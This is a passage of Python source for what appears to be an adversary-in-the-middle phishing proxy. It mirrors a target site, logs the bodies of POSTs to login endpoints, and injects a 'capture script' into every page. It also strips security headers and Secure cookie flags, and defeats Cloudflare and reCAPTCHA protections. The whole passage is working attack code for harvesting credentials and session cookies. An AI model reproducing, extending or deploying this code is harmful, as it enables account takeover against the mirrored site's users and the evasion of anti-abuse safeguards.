    methods=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"],
)
async def proxy(request: Request, path: str):
    query = request.url.query

    # Extract encoded subdomain from path
    subdomain = None
    if path.startswith("__sub/"):
        parts     = path.split("/", 2)
        subdomain = parts[1]
        path      = parts[2] if len(parts) > 2 else ""

    if subdomain:
        target_url = f"https://{subdomain}.{TARGET_DOMAIN}/{path}"
    else:
        target_url = urljoin(TARGET_BASE.rstrip("/") + "/", path)
    if query:
        target_url += f"?{query}"

    proxy_base   = str(request.base_url).rstrip("/")
    proxy_domain = urlparse(proxy_base).netloc

    # Session / cookie management
    sid        = request.cookies.get("proxy_session_id")
    session_id = await session_manager.get_or_create(sid)
    s_cookies  = await session_manager.get_cookies(session_id)
    browser_cookies = {k: v for k, v in request.cookies.items() if k != "proxy_session_id"}
    merged_cookies  = {**s_cookies, **browser_cookies}

    is_cdn_cgi = bool(CDN_CGI_RE.match(path))
    is_auth    = any(kw in path.lower() for kw in AUTH_KEYWORDS)

    # Block service worker files
    if path.lower() in ("sw.js", "service-worker.js", "serviceWorker.js", "service_worker.js"):
        return Response(
            content=b"self.addEventListener('install',e=>self.skipWaiting());"
                    b"self.addEventListener('activate',e=>e.waitUntil(self.clients.claim()));"
                    b"self.addEventListener('fetch',()=>{});",
            status_code=200,
            media_type="application/javascript",
        )

    # CF Solver — attempt once per session
    if not is_cdn_cgi and not await session_manager.has_clearance(session_id):
        await session_manager.update_cookies(session_id, {"_cf_solve_attempted": "1"})
        await proxy_logger.log("cf_solving", session_id, request.method, f"/{path}")
        cf_cookies = await cf_solver.solve(session_id, target_url)
        if cf_cookies:
            await session_manager.update_cookies(session_id, cf_cookies)
            merged_cookies.update(cf_cookies)
            await proxy_logger.log("cf_solved", session_id, data={"cookies": list(cf_cookies.keys())})
        else:
            await proxy_logger.log("cf_solve_failed", session_id)

    # ── Build outbound headers ─────────────────────────────────────────────
    is_nav = (
        request.method == "GET"
        and request.headers.get("sec-fetch-dest", "document") == "document"
        and not is_cdn_cgi
    )

    out_headers: Dict[str, str] = {}
    for k, v in request.headers.items():
        kl = k.lower()
        if kl in HOP_BY_HOP:
            continue
        if kl.startswith("sec-ch-") or kl.startswith("sec-fetch-") or kl == "dnt":
            continue
        if kl == "content-security-policy":
            continue
        if kl in ("referer", "origin"):
            v = v.replace(proxy_domain, TARGET_DOMAIN)
            v = v.replace(f"http://{TARGET_DOMAIN}", f"https://{TARGET_DOMAIN}")
        out_headers[k] = v

    out_headers["host"]             = f"{subdomain}.{TARGET_DOMAIN}" if subdomain else TARGET_DOMAIN
    out_headers["accept-encoding"]  = "identity"
    if not is_cdn_cgi:
        for k, v in (CHROME_NAV_HEADERS if is_nav else CHROME_FETCH_HEADERS):
            out_headers[k] = v

    if cf_solver._user_agent and any(k in merged_cookies for k in CF_COOKIE_NAMES):
        out_headers["user-agent"] = cf_solver._user_agent
        out_headers.pop("sec-ch-ua", None)
        out_headers.pop("sec-ch-ua-mobile", None)
        out_headers.pop("sec-ch-ua-platform", None)

    body = await request.body()
    req_content_type = request.headers.get("content-type", "")

    # ── AUTH endpoint handling ─────────────────────────────────────────────
    if request.method == "POST" and is_auth:
        await proxy_logger.log("auth_intercept", session_id, request.method, f"/{path}",
                               data={"payload": body.decode("utf-8", errors="replace")})

        # Step 1: Try browser-based solve (gets real CAPTCHA token + CF cookies)
        raw_referer = request.headers.get("referer", "")
        referer_url = (
            raw_referer.replace(proxy_domain, TARGET_DOMAIN).replace("http://", "https://")
            if raw_referer else TARGET_BASE
        )
        print(f"[AUTH] Browser solve attempt for {target_url}, referer={referer_url}")

        try:
            browser_result = await cf_solver.solve_with_browser(
                session_id, target_url, method="POST", body=body, referer=referer_url
            )
        except Exception as e:
            print(f"[AUTH] Browser solve exception: {e}")
            browser_result = None

        if browser_result and browser_result.get("result"):
            result      = browser_result["result"]
            resp_body   = result.get("body", "")
            resp_status = result.get("status", 200)
            print(f"[AUTH] Returning browser response: status={resp_status}")
            final = Response(
                content=resp_body.encode() if isinstance(resp_body, str) else resp_body,
                status_code=resp_status,
            )
            if sid != session_id:
                final.set_cookie("proxy_session_id", session_id,
                                 httponly=True, samesite="lax", max_age=SESSION_TIMEOUT)
            return final

        if browser_result and browser_result.get("cookies"):
            print("[AUTH] Got cookies from browser, proceeding with stripped body")
            merged_cookies.update(browser_result["cookies"])
            await session_manager.update_cookies(session_id, browser_result["cookies"])
        else:
            print("[AUTH] Browser solve did not succeed, falling back to stripped body")
            await proxy_logger.log("auth_browser_failed", session_id)

        # Step 2: Strip CAPTCHA fields from the body before forwarding
        body = strip_captcha_fields_from_body(body, req_content_type)

    # ── Fire upstream request ──────────────────────────────────────────────
    try:
        use_stream = request.method in ("GET", "HEAD")
        resp = await curl_client.request(
            method=request.method,
            url=target_url,
            headers=out_headers,
            cookies=merged_cookies,
            data=body if body else None,
            allow_redirects=False,
            stream=use_stream,
        )
        await proxy_logger.log("proxy_request", session_id, request.method, f"/{path}",
                               status=resp.status_code)
    except Exception as exc:
        await proxy_logger.log("proxy_error", session_id, request.method, f"/{path}",
                               data={"error": str(exc)})
        raise HTTPException(status_code=502, detail=f"Upstream error: {exc}")

    if resp.cookies:
        await session_manager.update_cookies(session_id, dict(resp.cookies))

    # ── cdn-cgi: stream raw bytes ──────────────────────────────────────────
    if is_cdn_cgi:
        async def _cdn_stream():
            try:
                async for chunk in resp.aiter_content():
                    yield chunk
            except Exception:
                pass

        cdn_resp = StreamingResponse(
            _cdn_stream(),
            status_code=resp.status_code,
            media_type=resp.headers.get("content-type", "application/octet-stream"),
        )
        raw_items = (
            resp.headers.multi_items()
            if hasattr(resp.headers, "multi_items")
            else list(resp.headers.items())
        )
        for k, v in raw_items:
            if k.lower() in ("content-length", "content-type", "transfer-encoding"):
                continue
            cdn_resp.headers.append(k, v)
        return cdn_resp

    # ── Response header processing ─────────────────────────────────────────
    processed: list = []
    raw_items = (
        resp.headers.multi_items()
        if hasattr(resp.headers, "multi_items")
        else list(resp.headers.items())
    )

    for k, v in raw_items:
        kl = k.lower()
        if kl in HOP_BY_HOP:
            continue
        if kl == "location":
            if TARGET_DOMAIN in v:
                v = v.replace(TARGET_DOMAIN, proxy_domain)
                v = v.replace(f"https://{proxy_domain}", f"http://{proxy_domain}")
            processed.append((k, v))
        elif kl == "set-cookie":
            v = COOKIE_DOMAIN_RE.sub("", v)
            v = re.sub(r"(?i);\s*Secure", "", v)
            is_cf_cookie = any(name in v for name in CF_COOKIE_NAMES)
            if not is_cf_cookie:
                v = re.sub(r"(?i);\s*SameSite=None", "; SameSite=Lax", v)
            processed.append((k, v))
        elif kl == "link":
            if TARGET_DOMAIN in v:
                v = v.replace(TARGET_DOMAIN, proxy_domain)
                v = v.replace(f"https://{proxy_domain}", f"http://{proxy_domain}")
            processed.append((k, v))
        elif kl == "content-security-policy":
            continue
        else:
            processed.append((k, v))

    content_type = resp.headers.get("content-type", "").lower()

    is_text = any(t in content_type for t in [
        "text/html", "javascript", "json", "application/javascript", "text/css",
    ])

    # ── Content rewriting ──────────────────────────────────────────────────
    if is_text:
        try:
            if use_stream:
                raw = await resp.acontent()
            else:
                raw = resp.content
        except Exception:
            raise HTTPException(status_code=502, detail="Upstream dropped connection.")

        text = raw.decode("utf-8", errors="ignore")

        if "text/html" in content_type:
            soup = BeautifulSoup(text, "html.parser")

            for tag in soup.find_all(["a", "link", "base"], href=True):
                tag["href"] = rewrite_url(tag["href"], proxy_domain, TARGET_BASE)
            for tag in soup.find_all(
                ["script", "img", "iframe", "source", "audio", "video"], src=True
            ):
                tag["src"] = rewrite_url(tag["src"], proxy_domain, TARGET_BASE)
            for tag in soup.find_all("form", action=True):
                tag["action"] = rewrite_url(tag["action"], proxy_domain, TARGET_BASE)

            for tag in soup.find_all(
                "meta", attrs={"http-equiv": lambda x: x and x.lower() == "refresh"}
            ):
                cv = tag.get("content", "")
                if ";" in cv:
                    delay, url_part = cv.split(";", 1)
                    if url_part.strip().lower().startswith("url="):
                        orig = url_part.strip()[4:].strip("'\"")
                        tag["content"] = (
                            f"{delay};url={rewrite_url(orig, proxy_domain, TARGET_BASE)}"
                        )

            for tag in soup.find_all("style"):
                if tag.string:
                    tag.string = rewrite_css(tag.string, proxy_domain)
            for tag in soup.find_all(style=True):
                tag["style"] = rewrite_css(tag["style"], proxy_domain)
            for tag in soup.find_all("script"):
                if tag.string and not tag.get("src"):
                    tag.string = rewrite_fast(tag.string, proxy_domain)

            # ── FIX: Remove reCAPTCHA elements + inject stub ───────────────
            soup = strip_recaptcha_from_html(soup)

            # ── FIX: Disable reCAPTCHA in JSON config responses ───────────
            # (already handled by strip_recaptcha_from_html, but also patch
            #  any inline JSON blobs that set reCaptchaSettings)
            for tag in soup.find_all("script"):
                if tag.string and "reCaptchaSettings" in tag.string:
                    tag.string = re.sub(
                        r'"reCaptchaSettings"\s*:\s*\{[^}]*\}',
                        '"reCaptchaSettings":{"enabled":false,"siteKey":"","actions":[]}',
                        tag.string,
                    )

            # ── Inject capture script ──────────────────────────────────────
            capture_soup = BeautifulSoup(get_capture_script(), "html.parser")
            head_tag = soup.find("head")
            if head_tag:
                head_tag.append(capture_soup)   # append AFTER the stub (stub is insert(0))
            elif soup.find("body"):
                soup.find("body").insert(0, capture_soup)
            else:
                soup.insert(0, capture_soup)

            rewritten = str(soup)

        elif "application/json" in content_type:
            try:
                data = json.loads(text)
                data = rewrite_json_obj(data, proxy_domain)
                # ── FIX: Disable reCAPTCHA in JSON API responses ──────────
                if isinstance(data, dict):
                    if "reCaptchaSettings" in data:
                        data["reCaptchaSettings"] = {
                            "enabled": False, "siteKey": "", "actions": []
                        }
                    # Also handle nested config objects
                    for key in ("config", "settings", "appConfig", "siteConfig"):
                        if isinstance(data.get(key), dict) and "reCaptchaSettings" in data[key]:
                            data[key]["reCaptchaSettings"] = {
                                "enabled": False, "siteKey": "", "actions": []
                            }
                rewritten = json.dumps(data)
            except json.JSONDecodeError:
                rewritten = rewrite_fast(text, proxy_domain)

        else:
            rewritten = rewrite_fast(text, proxy_domain)
            if "text/css" in content_type:
                rewritten = rewrite_css(rewritten, proxy_domain)

        final = Response(
            content=rewritten.encode("utf-8"),
            status_code=resp.status_code,
            media_type=content_type,
        )

    else:
        async def _stream():
            try:
                async for chunk in resp.aiter_content():
                    yield chunk
            except Exception:
                pass

        final = StreamingResponse(_stream(), status_code=resp.status_code)

    if "content-length" in final.headers:
        del final.headers["content-length"]

    if sid != session_id:
        final.set_cookie(
            key="proxy_session_id",
            value=session_id,
            httponly=True,
            samesite="Lax",
            max_age=SESSION_TIMEOUT,
        )

    for k, v in processed:
        if k.lower() in (
            "content-length", "content-type", "content-encoding", "transfer-encoding"
        ):
            continue
        final.headers.append(k, v)

    return final


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(
        app,
        host="127.0.0.1",
        port=8000,
        reload=False,
        loop="none",
    )